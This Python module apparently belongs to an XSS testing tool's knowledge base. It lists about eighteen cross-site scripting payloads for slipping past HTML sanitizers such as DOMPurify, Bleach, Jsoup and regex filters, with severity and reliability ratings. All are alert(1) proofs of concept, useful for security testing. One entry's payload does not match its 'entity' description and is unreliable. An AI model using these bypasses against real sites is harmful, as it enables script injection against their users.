#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

Sanitizer Bypass XSS Payloads
Bypasses for common HTML sanitizers
"""

from ..models import PayloadEntry


SANITIZER_BYPASSES_DATABASE = {
    # ===== DOMPURIFY BYPASSES =====
    "sanitizer_dompurify_001": PayloadEntry(
        payload="<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        contexts=["html_content", "dom_xss"],
        tags=["sanitizer", "dompurify", "bypass"],
        severity="critical",
        cvss_score=9.0,
        description="DOMPurify mXSS bypass (2020)",
        reliability="low",
    ),
    "sanitizer_dompurify_002": PayloadEntry(
        payload='<svg></p><style><g title="</style><img src=x onerror=alert(1)>">',
        contexts=["html_content", "dom_xss"],
        tags=["sanitizer", "dompurify", "bypass"],
        severity="critical",
        cvss_score=9.0,
        description="DOMPurify SVG bypass",
        reliability="low",
    ),
    "sanitizer_dompurify_003": PayloadEntry(
        payload="<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
        contexts=["html_content", "dom_xss"],
        tags=["sanitizer", "dompurify", "bypass"],
        severity="critical",
        cvss_score=9.0,
        description="DOMPurify form mXSS",
        reliability="low",
    ),
    # ===== SANITIZE-HTML BYPASSES =====
    "sanitizer_html_001": PayloadEntry(
        payload='<a href="jAvAsCrIpT:alert(1)">click</a>',
        contexts=["html_content", "href"],
        tags=["sanitizer", "sanitize-html", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="Case insensitive protocol bypass",
        reliability="medium",
    ),
    "sanitizer_html_002": PayloadEntry(
        payload='<a href="java\tscript:alert(1)">click</a>',
        contexts=["html_content", "href"],
        tags=["sanitizer", "sanitize-html", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="Tab in protocol bypass",
        reliability="medium",
    ),
    # ===== HTML PURIFIER BYPASSES =====
    "sanitizer_purifier_001": PayloadEntry(
        payload='<img src="x` `<script>alert(1)</script>"` `>',
        contexts=["html_content"],
        tags=["sanitizer", "htmlpurifier", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="HTML Purifier backtick bypass",
        reliability="low",
    ),
    # ===== BLEACH BYPASSES =====
    "sanitizer_bleach_001": PayloadEntry(
        payload='<a href="&#106;avascript:alert(1)">click</a>',
        contexts=["html_content", "href"],
        tags=["sanitizer", "bleach", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="Bleach entity bypass",
        reliability="medium",
    ),
    "sanitizer_bleach_002": PayloadEntry(
        payload='<a href="&#x6A;avascript:alert(1)">click</a>',
        contexts=["html_content", "href"],
        tags=["sanitizer", "bleach", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="Bleach hex entity bypass",
        reliability="medium",
    ),
    # ===== JSOUP BYPASSES =====
    "sanitizer_jsoup_001": PayloadEntry(
        payload='<a href="javascript&#x3A;alert(1)">click</a>',
        contexts=["html_content", "href"],
        tags=["sanitizer", "jsoup", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="Jsoup colon entity bypass",
        reliability="medium",
    ),
    # ===== COMMON BYPASSES =====
    "sanitizer_common_001": PayloadEntry(
        payload='<a href="data:text/html,<script>alert(1)</script>">click</a>',
        contexts=["html_content", "href"],
        tags=["sanitizer", "bypass", "data"],
        severity="high",
        cvss_score=7.5,
        description="Data URI href bypass",
        reliability="high",
    ),
    "sanitizer_common_002": PayloadEntry(
        payload='<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100></rect></a></svg>',
        contexts=["html_content", "svg"],
        tags=["sanitizer", "bypass", "xlink"],
        severity="high",
        cvss_score=7.5,
        description="SVG xlink bypass",
        reliability="high",
    ),
    "sanitizer_common_003": PayloadEntry(
        payload='<math><mrow><annotation-xml encoding="application/xhtml+xml"><script>alert(1)</script></annotation-xml></mrow></math>',
        contexts=["html_content", "mathml"],
        tags=["sanitizer", "bypass", "mathml"],
        severity="high",
        cvss_score=7.5,
        description="MathML annotation bypass",
        reliability="medium",
    ),
    # ===== ALLOWLIST BYPASSES =====
    "sanitizer_allow_001": PayloadEntry(
        payload="<img src=valid.jpg onload=alert(1)>",
        contexts=["html_content"],
        tags=["sanitizer", "bypass", "allowlist"],
        severity="high",
        cvss_score=7.5,
        description="Allowed tag event bypass",
        reliability="high",
    ),
    "sanitizer_allow_002": PayloadEntry(
        payload="<a href=javascript:alert(1)>click</a>",
        contexts=["html_content", "href"],
        tags=["sanitizer", "bypass", "allowlist"],
        severity="high",
        cvss_score=7.5,
        description="Allowed tag JS href",
        reliability="high",
    ),
    # ===== ENCODING BYPASSES =====
    "sanitizer_encoding_001": PayloadEntry(
        payload='<a href="javascript:alert(1)">click</a>',
        contexts=["html_content", "href"],
        tags=["sanitizer", "bypass", "encoding"],
        severity="high",
        cvss_score=7.5,
        description="HTML entity j bypass",
        reliability="high",
    ),
    "sanitizer_encoding_002": PayloadEntry(
        payload='<a href="\\u006aavascript:alert(1)">click</a>',
        contexts=["html_content", "href"],
        tags=["sanitizer", "bypass", "unicode"],
        severity="high",
        cvss_score=7.5,
        description="Unicode escape bypass",
        reliability="low",
    ),
    # ===== REGEX BYPASSES =====
    "sanitizer_regex_001": PayloadEntry(
        payload="<scr<script>ipt>alert(1)</script>",
        contexts=["html_content"],
        tags=["sanitizer", "bypass", "regex"],
        severity="high",
        cvss_score=7.5,
        description="Nested tag regex bypass",
        reliability="medium",
    ),
    "sanitizer_regex_002": PayloadEntry(
        payload="<<script>script>alert(1)</script>",
        contexts=["html_content"],
        tags=["sanitizer", "bypass", "regex"],
        severity="high",
        cvss_score=7.5,
        description="Double bracket regex bypass",
        reliability="medium",
    ),
}

SANITIZER_BYPASSES_TOTAL = len(SANITIZER_BYPASSES_DATABASE)
